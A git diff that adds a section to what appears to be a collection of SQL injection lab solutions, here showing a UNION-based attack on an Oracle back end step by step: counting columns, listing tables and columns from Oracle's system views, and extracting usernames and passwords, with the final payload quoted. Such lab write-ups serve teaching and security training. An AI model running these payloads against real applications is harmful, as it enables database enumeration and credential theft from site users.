@@ -100,3 +100,17 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username_pkza
 ```
 
 > Payload: `' UNION SELECT NULL, username_pkzadx||':'||password_ipdxdb FROM users_eusdjy--`
+
+## SQL injection attack, listing the database contents on Oracle
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a' FROM dual--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,table_name FROM all_tables--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_QZXPQS'--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,USERNAME_OTZUKP||':'||PASSWORD_XWQJRU FROM USERS_QZXPQS--'
+```
+
+> Payload: `' UNION SELECT NULL,USERNAME_OTZUKP||':'||PASSWORD_XWQJRU FROM USERS_QZXPQS--`
+
